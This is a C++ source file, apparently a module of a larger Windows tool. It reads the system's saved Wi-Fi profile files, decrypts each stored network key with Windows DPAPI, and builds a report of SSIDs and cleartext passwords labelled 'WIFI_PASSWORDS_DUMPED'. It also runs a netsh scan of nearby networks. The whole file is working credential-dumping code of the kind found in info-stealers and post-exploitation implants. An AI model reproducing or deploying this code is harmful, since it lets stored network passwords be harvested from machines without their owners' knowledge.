#include "WifiDumper.h"
#include "../utils/Exec.h"
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <filesystem>
#include <regex>
#include <fstream>
#include <iostream>
#include <vector>
#include <sstream>

#pragma comment(lib, "crypt32.lib")

namespace wifi {

    namespace fs = std::filesystem;

    namespace {
        std::string decryptKeyMaterial(const std::string& hexKey) {
            std::vector<BYTE> encryptedBytes;
            for (size_t i = 0; i < hexKey.length(); i += 2) {
                std::string byteString = hexKey.substr(i, 2);
                encryptedBytes.push_back((BYTE)strtol(byteString.c_str(), nullptr, 16));
            }

            DATA_BLOB dataIn;
            dataIn.cbData = (DWORD)encryptedBytes.size();
            dataIn.pbData = encryptedBytes.data();
            DATA_BLOB dataOut;

            // Decrypt using DPAPI
            if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
                std::string decrypted((char*)dataOut.pbData, dataOut.cbData);
                LocalFree(dataOut.pbData);
                return decrypted;
            }
            return "[DECRYPT FAILED]";
        }

        std::string getTagValue(const std::string& content, const std::string& tag) {
            // Try regex first
            std::regex re("<([a-zA-Z0-9_]+:)?" + tag + ">(.*?)</([a-zA-Z0-9_]+:)?" + tag + ">");
            std::smatch match;
            if (std::regex_search(content, match, re)) {
                return match[2].str();
            }
            // Fallback for simple find
            size_t start = content.find("<" + tag + ">");
            if (start == std::string::npos) {
                // Try with any prefix
                size_t colonStart = content.find(":" + tag + ">");
                if (colonStart != std::string::npos) {
                    start = content.find_last_of('<', colonStart);
                }
            }
            if (start != std::string::npos) {
                size_t endTagStart = content.find("</", start);
                size_t valueStart = content.find('>', start) + 1;
                if (endTagStart != std::string::npos && endTagStart > valueStart) {
                    return content.substr(valueStart, endTagStart - valueStart);
                }
            }
            return "";
        }
    }

    std::string dumpWifiProfiles() {
        std::string profilesPath = "C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces";
        std::string report = "WIFI_PASSWORDS_DUMPED (XML Method):\n";
        report += "SSID                                     PASSWORD                       AUTH\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        if (!fs::exists(profilesPath)) {
            return "WiFi profiles directory not found.";
        }

        int count = 0;
        try {
            for (const auto& interfaceEntry : fs::directory_iterator(profilesPath)) {
                if (!interfaceEntry.is_directory()) continue;

                for (const auto& profileEntry : fs::directory_iterator(interfaceEntry.path())) {
                    if (profileEntry.path().extension() != ".xml") continue;

                    std::ifstream file(profileEntry.path());
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                    std::string ssid = getTagValue(content, "name");
                    std::string auth = getTagValue(content, "authentication");
                    std::string keyMaterial = getTagValue(content, "keyMaterial");
                    std::string isProtected = getTagValue(content, "protected");
                    std::string password = "[OPEN/NO PASSWORD]";

                    if (!keyMaterial.empty()) {
                        if (isProtected == "false") {
                            password = keyMaterial;
                        } else {
                            password = decryptKeyMaterial(keyMaterial);
                        }
                    }

                    // Format line
                    std::stringstream line;
                    line << std::left << std::setw(40) << ssid.substr(0, 39) 
                         << std::setw(30) << password.substr(0, 29) 
                         << auth << "\n";
                    report += line.str();
                    count++;
                }
            }
        } catch (...) {}

        if (count == 0) {
            return "No saved WiFi profiles found.";
        }

        report += "\n\nTotal networks: " + std::to_string(count);
        return report;
    }

    std::string scanAvailableWifi() {
        // Use netsh equivalent to Python's subprocess.check_output
        std::string output = utils::RunCommand("netsh wlan show networks mode=Bssid");
        if (output.empty()) return "WIFI_SCAN_ERROR: Failed to run netsh.";

        // Basic parsing for report
        std::stringstream ss(output);
        std::string line;
        
        std::string report = "WIFI_SCAN_RESULTS:\n";
        report += "SSID                                     SIGNAL    AUTH            ENCRYPTION\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        struct Network {
            std::string ssid;
            std::string signal;
            std::string auth;
            std::string enc;
        } current;

        std::vector<Network> networks;
        
        // Manual parsing similar to Python's regex split
        // This is a simplified parser
        while (std::getline(ss, line)) {
            if (line.find("SSID") != std::string::npos && line.find(":") != std::string::npos) {
                 if (!current.ssid.empty()) {
                     networks.push_back(current);
                     current = Network();
                 }
                 size_t col = line.find(":");
                 current.ssid = line.substr(col + 1);
                 // Trim
                 current.ssid.erase(0, current.ssid.find_first_not_of(" \t\r\n"));
                 current.ssid.erase(current.ssid.find_last_not_of(" \t\r\n") + 1);
                 if (current.ssid.empty()) current.ssid = "[Hidden SSID]";
            }
            if (line.find("Signal") != std::string::npos) {
                 size_t col = line.find(":");
                 current.signal = line.substr(col + 1);
                 current.signal.erase(0, current.signal.find_first_not_of(" \t\r\n"));
                 current.signal.erase(current.signal.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Authentication") != std::string::npos) {
                 size_t col = line.find(":");
                 current.auth = line.substr(col + 1);
                 current.auth.erase(0, current.auth.find_first_not_of(" \t\r\n"));
                 current.auth.erase(current.auth.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Encryption") != std::string::npos) {
                 size_t col = line.find(":");
                 current.enc = line.substr(col + 1);
                 current.enc.erase(0, current.enc.find_first_not_of(" \t\r\n"));
                 current.enc.erase(current.enc.find_last_not_of(" \t\r\n") + 1);
            }
        }
        if (!current.ssid.empty()) networks.push_back(current);

        size_t limit = std::min(networks.size(), (size_t)30);
        for (size_t i = 0; i < limit; ++i) {
             std::stringstream row;
             row << std::left << std::setw(40) << networks[i].ssid.substr(0, 39)
                 << std::setw(10) << networks[i].signal
                 << std::setw(15) << networks[i].auth
                 << networks[i].enc << "\n";
             report += row.str();
        }

        report += "\n\nNetworks detected: " + std::to_string(networks.size());
        return report;
    }

}
